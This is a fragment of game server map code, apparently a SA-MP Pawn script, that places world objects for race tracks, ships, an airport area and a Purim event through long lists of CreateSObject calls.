	CreateSObject(8391, 33.881577, 1715.006348, 38.549072, 0.0000, 0.0000, 270.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, 60.821671, 1759.727173, 38.546013, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, 114.391052, 1820.446411, 38.546013, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, 114.378647, 1884.720337, 38.546013, 0.0000, 0.0000, 360.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, -72.011208, 1839.917480, 38.529404, 0.0000, 0.0000, 180.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, -72.041428, 1911.332764, 38.537247, 0.0000, 0.0000, 180.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, -18.480518, 1973.939697, 38.546013, 0.0000, 0.0000, 270.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, 52.647453, 2018.615601, 38.546005, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8391, 114.363525, 1954.868530, 38.533424, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3887, 20.012505, 1780.595581, 24.434090, 0.0000, 0.0000, 271.4063,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3866, -30.963348, 1915.753052, 24.479189, 0.0000, 0.0000, 180.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(8493, 28.978828, 1884.988892, 35.862732, 0.0000, 0.0000, 180.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(10009, 39.009678, 1896.518066, 20.352615, 0.0000, 0.0000, 180.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3866, 67.290909, 1977.447998, 24.479189, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3279, -33.372650, 1978.717285, 16.722912, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3279, -29.428841, 1778.777588, 16.697235, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3279, -35.481792, 1850.551025, 16.716242, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(3279, 75.613708, 1801.505127, 16.716242, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(12985, 3.513652, 1781.531982, 25.919828, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(16770, 62.354355, 1833.385742, 18.238174, 0.0000, 0.0000, 174.3750,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11457, 59.956879, 1878.586426, 16.248837, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11459, -9.281994, 1808.157959, 16.638802, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11425, 7.012039, 1945.312500, 18.462311, 0.0000, 0.0000, 225.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11425, 16.050087, 1948.060669, 18.462311, 0.0000, 0.0000, 326.2500,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11428, 0.456713, 1846.537842, 21.794106, 0.0000, 0.0000, 168.7500,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11442, 22.948158, 1807.978882, 16.564381, 0.0000, 0.0000, 270.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11440, -2.076952, 1889.296509, 16.237541, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(11425, 34.928093, 1961.664551, 18.462311, 0.0000, 0.0000, 315.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, 77.812729, 1801.361694, 34.375233, 0.0000, 0.0000, 90.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, 38.559509, 1789.435913, 34.205303, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, 30.476011, 1872.606323, 26.935787, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, 34.189495, 1920.183594, 28.631100, 0.0000, 0.0000, 270.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, -2.778265, 1939.162842, 18.221493, 0.0000, 0.0000, 258.7500,object_show_distance,0,worlds_dmz + dmz_gungame);
	CreateSObject(1676, 11.218456, 1949.797852, 18.221493, 0.0000, 0.0000, 0.0000,object_show_distance,0,worlds_dmz + dmz_gungame);
	// Race 2 Objects
	CreateSObject(3279,-2627.26,1130.04,54.40,0.00,0.00,56.75);
	CreateSObject(7073,-2317.60,1067.50,83.40,0.00,0.00,352.00);
	CreateSObject(10245,-2573.20,1143.20,57.30,0.00,0.00,116.00);
	CreateSObject(3749,-2586.80,1102.10,54.10,0.00,180.00,332.00);
	CreateSObject(3749,-2586.90,1102.10,64.60,0.00,359.50,332.00);
	CreateSObject(3528,-2582.00,1156.81,65.88,0.00,357.99,237.21);
	CreateSObject(3515,-2578.07,1119.95,53.70,0.00,0.00,6.00);
	CreateSObject(7392,-2678.05,1272.79,68.09,0.00,0.00,272.96);
	CreateSObject(19129,-2587.96,1099.18,54.52,0.00,0.00,333.51);
	CreateSObject(19002,-2581.33,1157.39,56.14,0.00,0.00,151.85);
	CreateSObject(3528,-2590.70,1108.09,69.00,-3.00,355.00,58.00);
	CreateSObject(19005,-2568.77,1176.50,54.02,0.00,0.00,336.89);
	CreateSObject(3472,-2495.53,1105.37,54.40,0.00,0.00,0.00);
	CreateSObject(6965,-2570.10,1138.25,57.04,0.00,0.00,359.65);
	CreateSObject(3471,-2592.31,1108.29,55.90,0.00,0.00,62.30);
	CreateSObject(3471,-2578.78,1101.56,55.90,0.00,0.00,64.34);
	CreateSObject(3374,-2544.19,1088.82,56.08,0.00,0.00,344.39);
	CreateSObject(3374,-2544.19,1088.82,59.11,0.00,0.00,344.39);
	CreateSObject(3374,-2544.19,1088.82,61.95,0.00,0.00,344.39);
	CreateSObject(3374,-2545.89,1089.26,56.11,0.00,0.00,344.28);
	CreateSObject(3374,-2544.19,1088.82,64.88,0.00,0.00,344.39);
	CreateSObject(3374,-2551.42,1091.63,62.18,0.00,0.00,344.39);
	CreateSObject(3374,-2551.38,1091.83,59.24,0.00,0.00,344.28);
	CreateSObject(3374,-2549.54,1090.20,56.11,0.00,0.00,344.28);
	CreateSObject(3374,-2547.99,1089.74,64.88,0.00,0.00,344.39);
	CreateSObject(3374,-2557.45,1092.27,56.01,0.00,0.00,337.11);
	CreateSObject(3374,-2557.40,1092.47,58.96,0.00,0.00,337.01);
	CreateSObject(3374,-2557.40,1092.47,61.83,0.00,0.00,337.01);
	CreateSObject(3374,-2565.54,1095.69,63.23,0.00,0.00,335.71);
	CreateSObject(3374,-2557.40,1092.47,64.66,0.00,0.00,337.01);
	CreateSObject(3374,-2560.08,1093.57,63.65,0.00,0.00,336.60);
	CreateSObject(3374,-2562.69,1095.11,60.12,0.00,0.00,336.61);
	CreateSObject(3374,-2568.29,1096.82,55.91,0.00,0.00,336.13);
	CreateSObject(3374,-2568.29,1096.75,58.87,0.00,0.00,336.02);
	CreateSObject(3374,-2568.19,1097.05,61.96,0.00,0.00,336.13);
	CreateSObject(3374,-2568.23,1096.96,63.91,0.00,0.00,336.13);
	CreateSObject(3374,-2562.69,1095.11,62.11,0.00,0.00,336.61);
	CreateSObject(6965,-2578.48,1141.68,57.04,0.00,0.00,359.65);
	CreateSObject(3472,-2574.57,1096.89,54.40,0.00,0.00,0.00);
	CreateSObject(715,-2567.62,1115.43,62.74,0.00,0.00,106.07);
	CreateSObject(3472,-2598.69,1108.97,54.40,0.00,0.00,0.00);
	CreateSObject(3472,-2544.67,1108.81,54.40,0.00,0.00,0.00);
	CreateSObject(3472,-2559.46,1111.63,54.40,0.00,0.00,229.49);
	CreateSObject(3472,-2564.61,1144.61,54.40,0.00,0.00,0.00);
	CreateSObject(3524,-2573.60,1153.20,53.60,0.00,0.00,336.00);
	CreateSObject(3528,-2579.24,1101.42,69.10,0.00,357.99,62.00);
	CreateSObject(3279,-2610.00,1153.90,54.40,0.00,0.00,232.85);
	CreateSObject(3472,-2506.27,1105.04,54.30,0.00,0.00,78.92);
	CreateSObject(3472,-2477.35,1105.97,54.40,0.00,0.00,324.17);
	CreateSObject(3472,-2536.14,1106.42,54.40,0.00,0.00,324.17);
	CreateSObject(3472,-2486.23,1105.58,54.40,0.00,0.00,78.92);
	CreateSObject(3472,-2581.20,1134.70,54.40,0.00,0.00,0.00);
	CreateSObject(7916,-2530.05,1137.17,55.46,0.00,0.00,346.74);
	CreateSObject(10009,-2525.25,1137.74,59.20,0.00,0.00,80.97);
	CreateSObject(980,-2518.65,1145.49,62.22,-91.00,0.00,357.14);
	CreateSObject(980,-2549.24,1149.52,61.31,88.00,0.00,349.89);
	CreateSObject(19335,-2513.96,1144.49,62.13,0.00,0.00,358.87);
	CreateSObject(715,-2592.83,1122.13,62.74,0.00,0.00,291.23);
	CreateSObject(3472,-2553.35,1109.43,54.40,0.00,0.00,324.17);
	// Ships
	CreateSObject(8411,2250.72119,578.01239,-58.17600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2274.60962,578.07269,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2279.00854,582.54059,-58.17600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2290.87744,586.21869,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2308.83228,582.67419,-58.17600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2313.29541,578.05127,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2338.66235,577.90204,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2340.50977,577.90088,-58.17600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2344.85767,582.60852,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2349.36450,586.39941,-58.15600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2374.76367,582.67474,-58.15600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2379.08447,577.95319,-58.17600,0.00000,0.00000,90.00000);
	CreateSObject(8411,2382.92920,577.79907,-58.19600,0.00000,0.00000,90.00000);
	CreateSObject(1378,2342.37183,548.51422,30.35198,0.00000,0.00000,180.00000);
	CreateSObject(1378,2311.53052,548.54413,30.35198,0.00000,0.00000,180.00000);
	CreateSObject(1376,2311.53638,521.52985,25.81623,0.00000,0.00000,0.00000);
	CreateSObject(1376,2342.40454,530.96490,25.83435,0.00000,0.00000,0.00000);
	CreateSObject(3620,2370.29736,538.16376,19.70457,0.00000,0.00000,0.00000);
	CreateSObject(3620,2392.22168,538.13159,19.70457,0.00000,0.00000,0.00000);
	CreateSObject(3620,2283.49268,538.36267,19.70457,0.00000,0.00000,0.00000);
	CreateSObject(3620,2242.19531,538.36182,19.70457,0.00000,0.00000,0.00000);
	CreateSObject(3573,2349.34180,555.62775,9.32741,0.00000,0.00000,0.00000);
	CreateSObject(3573,2333.78589,555.57898,9.32741,0.00000,0.00000,0.00000);
	CreateSObject(3573,2318.33740,555.54602,9.32741,0.00000,0.00000,0.00000);
	CreateSObject(3573,2304.15576,555.55908,9.30740,0.00000,0.00000,0.00000);
	CreateSObject(3575,2343.33081,572.71588,9.35620,0.00000,0.00000,-90.00000);
	CreateSObject(3575,2327.15039,572.72003,9.35620,0.00000,0.00000,-90.00000);
	CreateSObject(3575,2311.33643,573.04022,9.35620,0.00000,0.00000,90.00000);
	CreateSObject(3574,2381.19141,557.78333,9.41218,0.00000,0.00000,-90.00000);
	CreateSObject(3574,2272.88721,556.64178,9.41218,0.00000,0.00000,-90.00000);
	CreateSObject(3574,2253.08667,556.95923,9.41218,0.00000,0.00000,-90.00000);
	CreateSObject(3575,2264.97559,570.88318,9.35620,0.00000,0.00000,90.00000);
	// AP
	CreateSObject(3816,1662.71948,1674.53589,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3816,1593.63391,1674.49280,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3934,1614.94519,1560.47729,9.87777,0.00000,0.00000,0.00000);
	CreateSObject(3934,1652.60620,1531.02332,9.87777,0.00000,0.00000,306.47531);
	CreateSObject(3934,1661.66187,1545.65649,9.87777,0.00000,0.00000,333.57794);
	CreateSObject(3934,1616.07214,1545.62073,9.87777,0.00000,0.00000,198.32133);
	CreateSObject(3934,1637.36218,1526.64026,9.87777,0.00000,0.00000,273.27859);
	CreateSObject(3934,1623.14539,1532.72095,9.87777,0.00000,0.00000,228.11427);
	CreateSObject(3934,1663.78174,1560.77502,9.87777,0.00000,0.00000,0.00000);
	CreateSObject(18656,1551.25366,1154.86169,29.33655,-25.00000,0.00000,327.00000);
	CreateSObject(18656,1620.52319,1154.50476,29.33660,-25.00000,0.00000,33.00000);
	CreateSObject(3816,1291.35840,1440.99988,18.35320,0.00000,0.00000,90.00000);
	CreateSObject(731,1432.45715,1686.49304,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.20142,1647.56360,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.41431,1610.92188,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.44189,1575.56531,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.29578,1538.97522,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.58374,1504.95190,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.97339,1302.98389,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1433.04602,1332.49487,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1433.01660,1363.60510,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1432.90710,1394.71277,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1432.79443,1425.12109,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(18656,1294.65198,1580.07996,44.97385,0.00000,0.00000,-90.00000);
	CreateSObject(19086,1331.24927,1247.18323,19.72087,1.25999,-33.23999,-87.89999);
	CreateSObject(10166,1443.39539,1333.41077,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1444.42163,1623.67285,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1423.89636,1659.61865,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(10166,1444.68335,1533.44104,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1445.33643,1405.36584,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(8251,1527.65039,1168.97461,13.58898,0.00000,0.00000,180.03296);
	CreateSObject(8251,1527.42798,1207.48804,13.58898,0.00000,0.00000,180.03296);
	CreateSObject(3816,1374.96509,1833.69910,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.14685,1207.89954,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.06641,1223.49524,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1454.51819,1751.44812,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1433.43127,1238.38391,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1403.92712,1244.84656,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1381.75427,1263.00000,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.32190,1285.59412,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.16187,1265.47131,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.03210,1242.32202,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(10166,1404.49158,1210.05225,-1.10170,0.00000,0.00000,-22.44000);
	CreateSObject(731,1459.12720,1218.78271,6.77754,-90.00000,0.00000,65.85836);
	CreateSObject(731,1446.12830,1206.74670,6.77755,-90.00000,0.00000,65.85836);
	CreateSObject(731,1414.95398,1206.98120,6.77755,-90.00000,0.00000,65.85836);
	CreateSObject(731,1457.61060,1754.79724,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(10166,1423.41455,1789.39197,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(10166,1423.97729,1811.00110,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(3509,1455.55640,1241.68311,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1432.53088,1754.12793,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1411.46143,1750.81873,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1411.70374,1777.98547,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1410.98767,1802.61963,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1454.90540,1778.24573,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.52307,1801.97021,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.75452,1828.47607,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1456.60742,1852.36377,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(731,1413.01135,1224.21765,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1458.06213,1778.05542,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1458.57483,1801.24915,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1457.07861,1826.12842,6.77755,-90.00000,0.00000,53.79837);
	// AP 2
	CreateSObject(3816,1662.71948,1674.53589,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3816,1593.63391,1674.49280,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3934,1614.94519,1560.47729,9.87777,0.00000,0.00000,0.00000);
	CreateSObject(3934,1652.60620,1531.02332,9.87777,0.00000,0.00000,306.47531);
	CreateSObject(3934,1661.66187,1545.65649,9.87777,0.00000,0.00000,333.57794);
	CreateSObject(3934,1616.07214,1545.62073,9.87777,0.00000,0.00000,198.32133);
	CreateSObject(3934,1637.36218,1526.64026,9.87777,0.00000,0.00000,273.27859);
	CreateSObject(3934,1623.14539,1532.72095,9.87777,0.00000,0.00000,228.11427);
	CreateSObject(3934,1663.78174,1560.77502,9.87777,0.00000,0.00000,0.00000);
	CreateSObject(18656,1551.25366,1154.86169,29.33655,-25.00000,0.00000,327.00000);
	CreateSObject(18656,1620.52319,1154.50476,29.33660,-25.00000,0.00000,33.00000);
	CreateSObject(3816,1291.35840,1440.99988,18.35320,0.00000,0.00000,90.00000);
	CreateSObject(731,1432.45715,1686.49304,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.20142,1647.56360,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.41431,1610.92188,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.44189,1575.56531,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.29578,1538.97522,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.58374,1504.95190,9.80480,0.00000,0.00000,-0.06000);
	CreateSObject(731,1432.97339,1302.98389,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1433.04602,1332.49487,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1433.01660,1363.60510,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1432.90710,1394.71277,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(731,1432.79443,1425.12109,9.83752,0.00000,0.00000,0.00000);
	CreateSObject(18656,1294.65198,1580.07996,44.97385,0.00000,0.00000,-90.00000);
	CreateSObject(19086,1331.24927,1247.18323,19.72087,1.25999,-33.23999,-87.89999);
	CreateSObject(10166,1443.39539,1333.41077,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1444.42163,1623.67285,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1423.89636,1659.61865,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(10166,1444.68335,1533.44104,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(10166,1445.33643,1405.36584,-1.00182,0.00000,0.00000,75.12002);
	CreateSObject(8251,1527.65039,1168.97461,13.58898,0.00000,0.00000,180.03296);
	CreateSObject(8251,1527.42798,1207.48804,13.58898,0.00000,0.00000,180.03296);
	CreateSObject(3816,1374.96509,1833.69910,18.35423,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.14685,1207.89954,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.06641,1223.49524,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1454.51819,1751.44812,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1433.43127,1238.38391,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1403.92712,1244.84656,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1381.75427,1263.00000,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.32190,1285.59412,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.16187,1265.47131,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1370.03210,1242.32202,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(10166,1404.49158,1210.05225,-1.10170,0.00000,0.00000,-22.44000);
	CreateSObject(731,1459.12720,1218.78271,6.77754,-90.00000,0.00000,65.85836);
	CreateSObject(731,1446.12830,1206.74670,6.77755,-90.00000,0.00000,65.85836);
	CreateSObject(731,1414.95398,1206.98120,6.77755,-90.00000,0.00000,65.85836);
	CreateSObject(731,1457.61060,1754.79724,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(10166,1423.41455,1789.39197,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(10166,1423.97729,1811.00110,-1.33726,0.00000,0.00000,261.97885);
	CreateSObject(3509,1455.55640,1241.68311,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1432.53088,1754.12793,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1411.46143,1750.81873,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1411.70374,1777.98547,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1410.98767,1802.61963,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1454.90540,1778.24573,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.52307,1801.97021,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1455.75452,1828.47607,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(3509,1456.60742,1852.36377,9.76627,0.00000,0.00000,0.00000);
	CreateSObject(731,1413.01135,1224.21765,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1458.06213,1778.05542,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1458.57483,1801.24915,6.77755,-90.00000,0.00000,53.79837);
	CreateSObject(731,1457.07861,1826.12842,6.77755,-90.00000,0.00000,53.79837);
	// DJ
	CreateSObject(3749,-302.50,1507.80,79.98,0.00,0.00,2.80);
	CreateSObject(16362,-293.34,1572.36,77.31,0.00,0.00,45.38);
	CreateSObject(16362,-276.31,1555.43,77.31,0.00,0.00,45.38);
	// Purim Objects
	#if purim_now
	CreateSObject(8620, 2884.805176, -1772.251587, 39.033829, 0.0000, 0.0000, 262.0242,object_show_distance,0,world_purim);
	CreateSObject(14413, 2829.630615, -1787.721558, 15.916992, 0.0000, 0.0000, 347.9679,object_show_distance,0,world_purim);
	CreateSObject(10023, 2984.012695, -1789.859497, 24.689463, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(8417, 2963.614502, -1786.450195, 16.241972, 0.0000, 180.3777, 353.1245,object_show_distance,0,world_purim);
	CreateSObject(4565, 2882.731689, -1771.349731, 11.820396, 0.0000, 0.0000, 258.5865,object_show_distance,0,world_purim);
	CreateSObject(16779, 2882.064941, -1771.871338, 22.212234, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(13667, 2988.304688, -1791.215210, 32.295296, 0.0000, 0.0000, 180.3775,object_show_distance,0,world_purim);
	CreateSObject(9833, 2864.373779, -1768.435425, 13.644430, 0.0000, 0.0000, 341.9518,object_show_distance,0,world_purim);
	CreateSObject(8492, 2882.497803, -1771.464966, 27.096237, 0.0000, 0.0000, 227.7509,object_show_distance,0,world_purim);
	CreateSObject(3877, 2878.665527, -1771.207520, 18.603325, 0.0000, 0.0000, 72.1926,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.349121, -1812.091431, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.342529, -1812.168213, 20.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.428711, -1812.169312, 23.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.289307, -1812.136963, 26.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.979980, -1808.129395, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.216797, -1806.178345, 17.894201, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2970.521973, -1812.132813, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.008789, -1809.174438, 29.932541, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.390625, -1807.043701, 29.883728, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2971.473389, -1806.489380, 27.598877, 0.0000, 272.3375, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.434814, -1798.192139, 17.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.451904, -1798.184937, 20.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.455078, -1798.132690, 23.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.519043, -1798.109375, 26.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.294189, -1798.089355, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.587158, -1796.443604, 29.884539, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2972.944336, -1795.150146, 29.873005, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(7191, 2974.759033, -1753.017700, 18.365240, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(7191, 2966.040283, -1822.739990, 18.359453, 0.0000, 0.0000, 79.8237,object_show_distance,0,world_purim);
	CreateSObject(7191, 2943.465088, -1748.676514, 18.522036, 0.0000, 0.0000, 261.1648,object_show_distance,0,world_purim);
	CreateSObject(7191, 2932.251953, -1816.899536, 18.359453, 0.0000, 0.0000, 80.6830,object_show_distance,0,world_purim);
	CreateSObject(8229, 2919.425293, -1754.855347, 19.086006, 0.0000, 0.0000, 262.0242,object_show_distance,0,world_purim);
	CreateSObject(8229, 2911.945068, -1802.440430, 19.086006, 0.0000, 0.0000, 259.4459,object_show_distance,0,world_purim);
	CreateSObject(3472, 2898.889404, -1774.943604, 17.097103, 0.0000, 0.0000, 0.0000,object_show_distance,0,world_purim);
	CreateSObject(9833, 2915.381592, -1767.906982, 19.607168, 0.0000, 0.0000, 343.6707,object_show_distance,0,world_purim);
	CreateSObject(9833, 2912.001465, -1788.701172, 19.590549, 0.0000, 0.0000, 347.1084,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.627441, -1782.487549, 17.709494, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.578613, -1782.507202, 20.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.519043, -1782.455811, 23.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.485596, -1782.431152, 26.706282, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.510254, -1782.429443, 29.659355, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.891113, -1772.795166, 29.584045, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2973.993652, -1780.475220, 29.670151, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.302490, -1778.379150, 29.648666, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.907959, -1756.062134, 17.712278, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2975.263672, -1760.147827, 17.809538, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.692871, -1764.159424, 17.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.538818, -1764.207031, 20.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
	CreateSObject(3374, 2974.536865, -1764.229980, 23.884537, 0.0000, 0.0000, 351.4056,object_show_distance,0,world_purim);
